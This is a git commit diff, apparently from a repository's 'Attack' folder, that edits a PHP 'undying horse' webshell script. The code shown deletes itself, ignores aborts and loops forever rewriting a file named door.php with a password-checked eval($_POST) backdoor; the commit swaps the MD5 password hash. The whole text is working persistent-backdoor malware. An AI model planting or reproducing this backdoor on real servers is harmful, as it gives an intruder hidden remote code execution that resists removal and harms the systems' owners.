70321b457426b3ef1ec9e6ae29ede875609356ed
0.0 <48173483+Y0un9c@users.noreply.github.com>
2020-09-08 18:43:52 +0800

    Update 不死马.php

--- Attack/不死马.php
+++ Attack/不死马.php
@@ -3,7 +3,7 @@ ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = 'door.php';
-$code = '<?php if(md5($_GET["ma"])=="b74df323e3939b563635a2cba7a7afba"){@eval($_POST[a]);} ?>';
+$code = '<?php if(md5($_GET["ma"])=="668bd767946a9e6e50afc8de87ae9d52"){@eval($_POST[a]);} ?>';
 while (1){
     file_put_contents($file,$code);
     usleep(5000);
